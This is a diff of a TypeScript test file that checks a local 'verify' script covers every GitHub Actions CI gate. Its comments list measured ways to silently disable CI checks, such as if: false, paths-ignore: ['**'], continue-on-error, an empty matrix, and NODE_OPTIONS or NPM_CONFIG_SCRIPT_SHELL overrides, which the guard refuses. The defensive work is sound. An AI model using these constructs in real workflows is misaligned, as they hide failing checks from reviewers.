  * ever sees clean input changes nothing observable, which makes it look tested
  * when it is not — measured on the tree of 89 that carried it: turning the
  * equality below back into a `startsWith`
- * left this file 89/89 green until the case *does not exempt a command that
+ * left this file green until the case *does not exempt a command that
  * merely begins with a setup command* existed.
  *
  * Both halves are **equality**, deliberately. `startsWith` on the setup side is
@@ -5256,7 +5281,7 @@ function rowDrift(gate: CiGate, rows: readonly CiGate[]): string[] {
  * A named function for the reason {@link unaccounted} gives, and it was needed:
  * with the rule written inline, dropping the `gating` flag on the way into
  * {@link COMMANDS} — reintroducing defect ten's `.map(c => c.text)` exactly —
- * left the tree of 115 that carried it green at 115/115, because no command in
+ * left the tree that carried it green, because no command in
  * `ci.yml` is suppressed and
  * an inline rule over clean input asserts nothing. That measurement is the whole
  * argument for this function existing.
@@ -5390,7 +5415,7 @@ const INTERPRETED_KEYS = [
  * that decide whether a written gate **executes**:
  *
  * - `if: false` on the `static` job — which `test-ts`, `test-rust` and
- *   `test-windows` all `needs:` — was `196 passed (196)`, exit 0, twice on the
+ *   `test-windows` all `needs:` — was **green**, exit 0, twice on the
  *   tree that shipped after round five, while the byte-equivalent statement of
  *   the same fact about the same job, `continue-on-error: true`, was `no tests`,
  *   exit 1, refused **by name**. One referent, two spellings in one document,
@@ -5401,9 +5426,9 @@ const INTERPRETED_KEYS = [
  *   its `github.event_name != 'pull_request' ||` clause deleted, which skips
  *   every push) and `if: github.event_name == 'workflow_dispatch'` on
  *   `test-windows` (which takes the two gates only that job runs out of every
- *   push and pull request) were each `196 passed (196)`, exit 0.
+ *   push and pull request) were each **green**, exit 0.
  * - `strategy: matrix: include: []` on `test-ts` expands the job to no runs at
- *   all: `196 passed (196)`, exit 0. The header disclosed only that a matrix can
+ *   all: **green**, exit 0. The header disclosed only that a matrix can
  *   *multiply* a job. Multiplication by zero is the other direction.
  *
  * The fix is not a fourth named refusal. It is that the licence is gone: a key
@@ -5412,7 +5437,7 @@ const INTERPRETED_KEYS = [
  * nothing is a red. `env:` is in this list for the same reason and closes a
  * third construction — `NODE_OPTIONS: --require ./scripts/ci-probe-gate.cjs`
  * and `NPM_CONFIG_SCRIPT_SHELL: /usr/bin/true` in `ci.yml`'s workflow-level
- * `env:` were each `196 passed (196)`, exit 0 on that same tree, the second
+ * `env:` were each **green**, exit 0 on that same tree, the second
  * while the byte-equivalent `script-shell=` line in the tracked `.npmrc` was
  * refused at module load by name.
  *
@@ -5525,11 +5550,11 @@ function renderYaml(node: YamlNode): string {
  *
  * Guarded in the direction that matters and **unguarded in the other**, stated
  * rather than left to be found. Widening reddens: adding `'python'` is
- * `2 failed | 208 passed (210)`, exit 1, twice on the tree this comment ships
+ * **two reds**, exit 1, twice on the tree this comment ships
  * in, at *refuses a run: whose shell is not one this reader can split* and
  * *refuses the same shell set as a workflow default — defect nine*, which are
  * hand-built documents this tree does not contain. **Narrowing does not**:
- * dropping `'cmd'` is `210 passed (210)`, exit 0, twice. That is left unguarded
+ * dropping `'cmd'` is **green**, exit 0, twice. That is left unguarded
  * on purpose — a shell removed from this list is refused rather than
  * mis-split, so the error is an over-report costing a review, which is the
  * direction this file trades for everywhere else. It is written down because an
@@ -5543,6 +5568,24 @@ const SPLITTABLE_SHELLS = ['bash', 'sh', 'pwsh', 'powershell', 'cmd'];
  * rather than skipped, for the reason in {@link TOP_LEVEL_KEYS}: a default
  * applies to every step in the file, so a default it cannot read is every step
  * read wrong.
+ */
+/**
+ * The two key lists under `defaults:` — the only lists in this file that sat
+ * outside every accounting.
+ *
+ * Round six's flagship accounting case asserts the union of three of this
+ * file's five key lists, and these are the other two: appending
+ * `'probe-anything'` to either was green, twice, on the tree this comment ships
+ * in, while narrowing either reds at *reads a defaults.run it does understand
+ * without refusing*. GitHub accepts no third key at either scope, so what a
+ * widening admits is an over-report at worst — which is why the round-six
+ * critic filed it as a note rather than a failure, and it is also "the closing
+ * move leaving one unguarded copy of the thing it closed", which is this file's
+ * governing class and has recurred in five consecutive rounds. It is closed
+ * here by the same move the data lists get: the list itself is pinned.
+ *
+ * Read by {@link modelOf}'s defaults block, by *the defaults: keys this reader
+ * admits are the two GitHub has*, and by nothing else.
  */
 const DEFAULTS_KEYS = ['run'];
 const DEFAULTS_RUN_KEYS = ['shell', 'working-directory'];
@@ -5558,7 +5601,7 @@ const DEFAULTS_RUN_KEYS = ['shell', 'working-directory'];
  * that reorders work and false of this one: adding `paths-ignore: ['**']` under
  * `push:` and under `pull_request:` — with every gate, `package.json` and
  * `.npmrc` byte-identical — takes every push and every pull request out of CI,
- * and was measured **`181 passed (181)`, exit 0**, twice, on the tree that
+ * and was measured ****green**, exit 0**, twice, on the tree that
  * shipped after round four. The parser handled it silently and correctly:
  * `['**']` is kept as an opaque flow-sequence scalar the way `branches: [main]`
  * already is, so the totality net saw a line it understood and the model dropped
@@ -5600,7 +5643,7 @@ const TRIGGER_EVENTS = ['push', 'pull_request', 'workflow_dispatch'];
  *
  * Read by {@link triggersOf}, and by nothing else. Load-bearing, measured on
  * the tree this comment ships in, twice: making the unknown-filter branch
- * unreachable is `3 failed | 193 passed (196)`, exit 1 — one row per filter
+ * unreachable is **three reds**, exit 1 — one row per filter
  * spelling, and none of them is a filter `ci.yml` carries, so a rule over the
  * real file alone would assert nothing.
  */
@@ -5682,7 +5725,7 @@ function triggersOf(at: (line: number) => string, node: YamlNode | undefined): r
  * Read by {@link modelOf}, and by *a needs: naming no job takes the whole
  * workflow out of CI — defect twenty-six*. The membership test it feeds is
  * load-bearing, measured on the tree this comment ships in, twice: making that
- * loop always `continue` is `1 failed | 195 passed (196)`, exit 1, at that case
+ * loop always `continue` is **one red**, exit 1, at that case
  * — every `needs:` in `ci.yml` resolves, so the rule has to be asked about a
  * document this tree does not contain.
  */
@@ -5715,8 +5758,8 @@ function needsNamesOf(node: YamlNode | undefined): readonly string[] | undefined
  * adversary re-measured it unfixed; reproduced here on the tree that shipped
  * after round four, twice each: `INPUT_REPOSITORY: other-org/not-this-repo` plus
  * `INPUT_REF: probe-branch` appended to `ci.yml`'s existing workflow-level
- * `env:` block was `181 passed (181)` exit 0, and `env: INPUT_RUN_INSTALL:
- * 'recursive'` on the `static` job was `181 passed (181)` exit 0 — while the
+ * `env:` block was **green** exit 0, and `env: INPUT_RUN_INSTALL:
+ * 'recursive'` on the `static` job was **green** exit 0 — while the
  * byte-identical two lines on the `pnpm/action-setup@v4` step inside that job
  * were `no tests`, exit 1.
  *
@@ -5733,7 +5776,7 @@ function needsNamesOf(node: YamlNode | undefined): readonly string[] | undefined
  * Read at the three scopes an `env:` can be written in — workflow, job and step
  * — inside {@link modelOf}, and by *refuses an INPUT_ env: at $scope scope —
  * defect twenty-seven*. Load-bearing, measured on the tree this comment ships
- * in, twice: making it a no-op is `4 failed | 192 passed (196)`, exit 1 — the
+ * in, twice: making it a no-op is **four reds**, exit 1 — the
  * four scope-and-spelling rows of that case; `ci.yml` carries a workflow-level
  * `env:` with no such key, so it is the rows that carry this rule and not the
  * repository.
@@ -5784,7 +5827,7 @@ const entry = (entries: readonly YamlEntry[], key: string): YamlNode | undefined
  * Defect fourteen is the reason this exists. `modelOf` refused a step only when
  * `scalarOf(entry(step, 'continue-on-error')) === 'true'` — five bytes, one of
  * the three spellings the schema resolves to boolean true. `continue-on-error:
- * True` on the `Typecheck` step of `static` was **141/141 green**, twice, on the
+ * True` on the `Typecheck` step of `static` was **green**, twice, on the
  * tree that shipped after round two, while the byte-identical step spelled
  * `true` was red twice at module load. That is a *textual* question in the
  * refusal this file argues hardest for, one round after the commit message said
@@ -5808,7 +5851,7 @@ function yamlBoolean(scalar: string | undefined): boolean | undefined {
  * {@link yamlBoolean}'s comment said a quoted `"true"` was one of the values it
  * returns `undefined` for. Measured on the tree that shipped after round four,
  * twice each: `continue-on-error: 'false'` on the `static` job was
- * `181 passed (181)` exit 0, and `continue-on-error: 'true'` was `no tests`
+ * **green** exit 0, and `continue-on-error: 'true'` was `no tests`
  * exit 1 with the job-level refusal message — i.e. the quoted spellings resolved
  * *identically* to the plain ones, because `parseWorkflowYaml` strips the quotes
  * in its value reader and the resolver never saw them. The habit is already in
@@ -5826,7 +5869,7 @@ function yamlBoolean(scalar: string | undefined): boolean | undefined {
  * Read by {@link refuseSuppression}, which is the only place a boolean scalar
  * changes this reader's verdict. Load-bearing, measured on the tree this comment
  * ships in, twice: dropping the `plain` test — which is exactly the reader this
- * file shipped for four rounds — is `1 failed | 195 passed (196)`, exit 1, at
+ * file shipped for four rounds — is **one red**, exit 1, at
  * *resolves continue-on-error from a plain scalar, not from its text — defect
  * twenty-four*, on `expected false to be undefined`.
  */
@@ -5845,7 +5888,7 @@ function yamlBooleanOf(node: YamlNode | undefined): boolean | undefined {
  * identical key in {@link JOB_KEYS} as one this reader "knows" while reading it
  * nowhere: `continue-on-error: true` on the `static` job takes `pnpm
  * typecheck`, `cargo fmt --all --check` and `cargo clippy` out of the set of
- * things that can fail the run, and was **141/141 green**, twice. That is defect
+ * things that can fail the run, and was **green**, twice. That is defect
  * nine's own sentence — "listing a key as known is not knowing what it does" —
  * landing on the key next door.
  */
@@ -5919,7 +5962,7 @@ function modelOf(workflow: Workflow, readWorkflows: ReadonlySet<string>): Workfl
   // default was listed in TOP_LEVEL_KEYS as a key this reader "knows" and then
   // never read. Measured on the tree carrying the fix for four to six, whose
   // whole suite was 91, twice: a top-level `defaults: run: shell:
-  // python` left the file 91/91 green, while the same three lines inside a job
+  // python` left the file green, while the same three lines inside a job
   // are refused, because JOB_KEYS has no `defaults`. Listing a key as known is
   // not knowing what it does; that gap is the whole class this file is about.
   //
@@ -6006,7 +6049,7 @@ function modelOf(workflow: Workflow, readWorkflows: ReadonlySet<string>): Workfl
     // "knows" and read nowhere, licensed by the header's "can only name, remove
     // or reorder work". True of `needs` as an ordering key; false of `needs` as
     // a NAME. Renaming this workflow's `static:` job to `static-checks:` and
-    // leaving its three `needs: static` lines alone was `181 passed (181)`, exit
+    // leaving its three `needs: static` lines alone was **green**, exit
     // 0, twice, on the tree that shipped after round four. That GitHub then
     // rejects the whole file rather than running the other jobs is NOT
     // established here — no runner was run — and this refusal does not turn on
@@ -6037,7 +6080,7 @@ function modelOf(workflow: Workflow, readWorkflows: ReadonlySet<string>): Workfl
     // JOB_KEYS as one this reader "knows" and was read nowhere, while the
     // identical key on a STEP was refused by name with an argument for why it
     // must be. `continue-on-error: true` on `static` takes all three of its
-    // gates out of the set of things that can fail CI and was 141/141 green.
+    // gates out of the set of things that can fail CI and was green.
     refuseSuppression(
       at(line),
       entry(job, 'continue-on-error'),
@@ -6261,7 +6304,7 @@ function normaliseUsesPath(target: string): string | undefined {
  *           await exec.exec('pnpm', ['probe-unlisted-gate']);
  *           await exec.exec('cargo', ['test', '--workspace', '--locked', '--no-run']);
  *
- * added to `test-ts` was **141/141 green**, twice, on the tree that shipped
+ * added to `test-ts` was **green**, twice, on the tree that shipped
  * after round two, while the same two commands written as an ordinary
  * `run: pnpm probe-unlisted-gate` step in the same position was `1 failed | 140
  * passed`, twice. Nothing there was out of reach: the commands are eight lines
@@ -6300,8 +6343,8 @@ interface ThirdPartyAction {
    * pinned third-party action is one the workflows really use* against the
    * `actionInputs` that function returns. Measured on the tree that shipped
    * after round five, twice: adding `'probe-input'` to
-   * `actions/checkout@v4`'s empty list was `196 passed (196)`, exit 0, and is
-   * `1 failed | 209 passed (210)`, exit 1, on the tree this comment ships in.
+   * `actions/checkout@v4`'s empty list was **green**, exit 0, and is
+   * **one red**, exit 1, on the tree this comment ships in.
    * Read by {@link refuseWith} and by that case, and by nothing else.
    */
   readonly inputs: readonly string[];
@@ -6389,7 +6432,7 @@ function isThirdPartyAction(target: string): boolean {
  * with `./` or `../`, or match `.yml@`?" — in place of the real one, and so
  * classified as a harmless third-party action every target that missed all
  * three patterns. Measured on the tree that carried the fixes for seven to ten,
- * each construction twice, each **117/117 green**, while the control spelling
+ * each construction twice, each **green**, while the control spelling
  * `./.github/actions/probe-composite` was red twice on that same tree:
  *
  *     - uses: ./.github/workflows/../actions/probe-composite/action.yml
@@ -6441,7 +6484,7 @@ function refuseUses(
   // unreadable value was refused in one key and admitted in the other. Measured
   // on the tree of 91 that carried the fix for four to six, twice:
   // `uses: ${{ env.PROBE_ACTION }}` added to two steps left
-  // the file 91/91 green, and the arms below decided a target they had not read.
+  // the file green, and the arms below decided a target they had not read.
   //
   // Whether GitHub's own parser would run that step is not the question this
   // reader gets to answer, and deliberately so: the value is not in the file, so
@@ -6458,7 +6501,7 @@ function refuseUses(
 
   // Case-insensitive, and that is round two's second finding rather than a
   // flourish: with `/\.ya?ml@/u`, `other-org/shared-ci/.github/workflows/
-  // gates.YML@main` was 141/141 green twice while the byte-identical target
+  // gates.YML@main` was green twice while the byte-identical target
   // spelled `gates.yml@main` was red twice. One referent, two spellings,
   // opposite verdicts, inside the function the round-two commit message says it
   // converted from a spelling question to a fact. Whether GitHub accepts the
@@ -6505,7 +6548,7 @@ function refuseUses(
     // of those normalises onto a file that was read. Measured on the tree that
     // shipped after round two, twice each: all three, pointed at the real
     // workflow, take the file down at module load, while the plain path leaves
-    // it 141/141 green. The reader has no way to know which reading the
+    // it green. The reader has no way to know which reading the
     // runner takes, and the cost of asking for the plain spelling is a review
     // while the cost of guessing is a gate.
     if (target === `./${resolved}`) return;
@@ -6549,7 +6592,7 @@ function refuseUses(
  * action; it says nothing about a name sitting in {@link ThirdPartyAction} that
  * no workflow hands, and that name is where a removed input would wait to admit
  * its return unreviewed. Adding `'probe-input'` to `actions/checkout@v4`'s empty
- * list was `196 passed (196)`, exit 0, twice on the tree that shipped after
+ * list was **green**, exit 0, twice on the tree that shipped after
  * round five — the same shape the case beside {@link THIRD_PARTY_ACTIONS} argues
  * against for the `uses` half, one key further in.
  *
@@ -6584,7 +6627,7 @@ function refuseWith(at: string, action: ThirdPartyAction | undefined, node: Yaml
   // The inputs this workflow really hands that action, so the `inputs` half of
   // a pin row can be checked in the widening direction too. Round six measured
   // that half unpinned: adding `'probe-input'` to `actions/checkout@v4`'s empty
-  // list was `196 passed (196)`, exit 0, twice, because the case beside
+  // list was **green**, exit 0, twice, because the case beside
   // THIRD_PARTY_ACTIONS read the `uses` half of every row and never this one —
   // the same one-directional pin the comment in that case argues against, in
   // the row it argues about.
@@ -6611,7 +6654,7 @@ function refuseWith(at: string, action: ThirdPartyAction | undefined, node: Yaml
  *       with:
  *         version: 10
  *
- * was `172 passed (172)`, exit 0, while the byte-equivalent input written as
+ * was **green**, exit 0, while the byte-equivalent input written as
  * `with: run_install:` on the same step was red twice by name. One action, one
  * input, two spellings, opposite verdicts — inside the function written to close
  * exactly that, on the key next door.
@@ -6631,11 +6674,19 @@ function refuseWith(at: string, action: ThirdPartyAction | undefined, node: Yaml
  * text at all, and every one of the header's three `env:` sentences argued from
  * command text, which is why none of them covered this.
  *
- * Read by {@link modelOf}, at both levels, and by *an env: on a uses: step is
- * the with: pin written the other way — defect twenty-one*. Load-bearing,
- * measured on the tree this comment ships in, twice: making this a no-op is
- * `1 failed | 195 passed (196)`, exit 1 twice, at that case — `ci.yml` carries
- * no `env:` on a `uses:` step, so nothing else in the file sees it. That red is
+ * Read by {@link modelOf}, at both levels, and by two cases: *an env: on a
+ * uses: step is the with: pin written the other way — defect twenty-one*, which
+ * asks it at step scope, and *refuses an env: beside a uses: at BOTH scopes —
+ * RULE W over refuseEnvOnUses*, which asks it at each. The second exists
+ * because the FUNCTION was load-bearing and one of its two WIRINGS was not:
+ * the job-level call site could be deleted with the whole suite green, since
+ * every assertion about the function went through the step site one screen
+ * below it. One referent, two wirings, one law — round four's shape, found
+ * inside a reader. The `scope` parameter is what makes the two separable in a
+ * message. Load-bearing, measured on the tree this comment ships in, twice:
+ * making this a no-op is **two reds**, exit 1 twice, at those two cases —
+ * `ci.yml` carries no `env:` on a `uses:` step, so nothing else in the file
+ * sees it. That red is
  * now on the *message* rather than on the absence of a throw:
  * {@link refuseActionInputEnv} catches an `INPUT_`-shaped key at any scope, so
  * what only this function refuses is an **ordinary** key on a `uses:` step,
@@ -6759,7 +6810,7 @@ const JOBS: readonly WorkflowJob[] = SURFACE.models.flatMap((model) => model.job
  * *wiring* being testable, and that distinction was measured too: after
  * {@link unenforcedGates} was extracted and given cases of its own, putting
  * defect ten straight back here — dropping `gating` on the way through, exactly
- * as the old `.map(c => c.text)` did — was still 116/116 green, twice, on the
+ * as the old `.map(c => c.text)` did — was still green, twice, on the
  * tree of 116 that carried it. A rule
  * with no path from the document to its input asserts nothing about the
  * document. Its cases are in *carries the gating flag from the parsed step into
@@ -6820,7 +6871,7 @@ interface VerifyCommand {
    * Measured on the tree that shipped after round three, twice: a `verify` of
    * `cd probe && pnpm typecheck && … && cd ../src-tauri && cargo build …`,
    * alongside a probe manifest whose eight scripts are `node -e ""`, was
-   * `172 passed (172)`, exit 0. Every command parsed, every program listed,
+   * **green**, exit 0. Every command parsed, every program listed,
    * every gate row satisfied — against bodies that had nothing to do with what
    * runs. The runtime half was measured too, with a read-only `pnpm run` in the
    * real worktree: `sh -c 'cd probe && pnpm typecheck'` printed
@@ -6847,7 +6898,7 @@ interface VerifyCommand {
    * directly by *a pnpm script name behind a cd binds to a manifest nobody read
    * — defect nineteen*, which asserts the flag's value per command.
    * Three separate mutations, each measured on the tree this comment ships in,
-   * twice, each `1 failed | 195 passed (196)` with exit 1 twice at *a pnpm
+   * twice, each **one red** with exit 1 twice at *a pnpm
    * script name behind a cd binds to a manifest nobody read — defect nineteen*:
    * `chainOf` no longer setting the flag at a `cd`; `chainOf` setting it and
    * following the edge anyway; and {@link unclassifiedVerifyCommands} no longer
@@ -6881,7 +6932,7 @@ interface VerifyCommand {
  * accepts, and `exit 0` is not one. This comment used to claim the walk returned "every command
  * **reachable** from a script, by invocation rather than by mention"; it
  * returned every command *written*, and `exit 0 && <the whole shipped chain>`
- * was 141/141 green against it.
+ * was green against it.
  *
  * Non-gating and unreached commands are collected too, and marked. They are what
  * lets the failure message tell "you never added this gate" apart from "you
@@ -8242,5 +8293,96 @@ describe('a gate is its invocation, its body, its config and its wrapper', () =>
     expect(() =>
       wrapperDecisionsIn('probe.mjs', 'const MAX_ATTEMPTS = 2;\nfunction isRunnerCrash(t) {\n  return true;\n}\n'),
     ).toThrow('has no function "reachedAVerdict"');
+  });
+});
+
+/* -------------------------------------------------------------------------- */
+/* the convention this file keeps about its own prose                          */
+/* -------------------------------------------------------------------------- */
+
+/**
+ * This file, as a path the enumeration below can open.
+ *
+ * Read by *no comment in this file quotes a suite total*, and by nothing else.
+ */
+const GUARD_FILE = 'src/platform/verify-covers-ci.test.ts';
+
+describe('the prose in this file is held to a rule something can red on', () => {
+  it('no comment in this file quotes a suite total', () => {
+    // RULE V applied to the convention this file keeps about its own comments,
+    // which is where round six failed: the header stated "every count quoted
+    // against the tree this comment ships in is out of 210" and fourteen of the
+    // twenty sites carrying that phrase quoted a total out of 196. Nothing in
+    // the guard checked that a count in a docblock matched the tree it named,
+    // and that class of claim is what this file leans on hardest.
+    //
+    // The rule is not "keep the totals right" — a total moves whenever a case is
+    // added anywhere in this file, so keeping them right is a task every round
+    // has to redo and six rounds have failed. The rule is that a suite total is
+    // not evidence about a mutation and is not written down at all. What a
+    // mutation is evidence for is the case it reddens and the exit code, and
+    // neither moves when a case is added.
+    const source = readFileSync(join(REPO_ROOT, GUARD_FILE), 'utf8');
+
+    // Not vacuous: a wrong path throws, and a right path that somehow read
+    // something else would not carry this file's own header sentence.
+    expect(
+      source,
+      'the totals rule read a file that is not this one, so its verdict is about ' +
+        'nothing. GUARD_FILE has to name this file.',
+    ).toContain('the local gate is a superset of the remote one');
+
+    expect(
+      [...source.matchAll(/\d+ passed \(\d+\)|\b\d+\/\d+ green\b/gu)].map(([total]) => total),
+      'a comment in this file quotes a suite total. Do not correct the number: ' +
+        'delete it. A total is a property of the suite, not of the mutation — it ' +
+        'moves whenever a case is added anywhere in this file, which is how round ' +
+        'two\'s wrong-number defect came back in round six as a wrong tree label ' +
+        'on right numbers, in the same round that wrote the paragraph asserting ' +
+        'the labels were right. Record the case that reddened and the exit code; ' +
+        'a count of REDS is fine, because that is a property of the mutation.',
+    ).toEqual([]);
+  });
+  it('the defaults: keys this reader admits are the two GitHub has', () => {
+    // The two key lists that sat outside round six's accounting case. Widening
+    // either was green twice; that is the closing move leaving one unguarded
+    // copy of the thing it closed, for the fifth consecutive round.
+    expect(
+      DEFAULTS_KEYS,
+      'a key was added to or removed from DEFAULTS_KEYS. GitHub has exactly one ' +
+        'key under "defaults:", and a key this reader admits there is a default ' +
+        'it applies to every step in the file.',
+    ).toEqual(['run']);
+    expect(
+      DEFAULTS_RUN_KEYS,
+      'a key was added to or removed from DEFAULTS_RUN_KEYS. GitHub has exactly ' +
+        'two keys under "defaults.run:", and a default this reader admits and ' +
+        'does not read is every step in the file read wrong.',
+    ).toEqual(['shell', 'working-directory']);
+  });
+});
+
+describe('the numbers this file quotes about its own chain are asserted, not asserted about', () => {
+  it('an exit 0 in front of verify expands to the same commands and runs none of them', () => {
+    // Defect thirteen's arithmetic, moved out of the header's prose and into a
+    // case. RULE T: prose neither creates nor proves an edge, and an earlier
+    // version of that bullet said "thirteen real gating invocations", which is
+    // not a number this tree returns. What makes the numbers stable enough to
+    // pin is MANIFEST_SCRIPTS, which pins the `verify` body they are counted
+    // from — before this round that body could be rewritten with nothing red.
+    const shipped = chainOf('verify', PACKAGE.scripts);
+    expect(shipped).toHaveLength(23);
+    expect(shipped.filter((entry) => entry.script === 'verify')).toHaveLength(11);
+
+    const spliced = chainOf('verify', {
+      ...PACKAGE.scripts,
+      verify: `exit 0 && ${PACKAGE.scripts.verify ?? ''}`,
+    });
+    expect(spliced).toHaveLength(24);
+    expect(spliced.filter((entry) => entry.gating)).toHaveLength(24);
+    expect(spliced.filter((entry) => entry.script === 'verify')).toHaveLength(12);
+    expect(
+      spliced.filter((entry) => entry.script === 'verify' && entry.command.program === 'pnpm'),
+    ).toHaveLength(8);
   });
 });
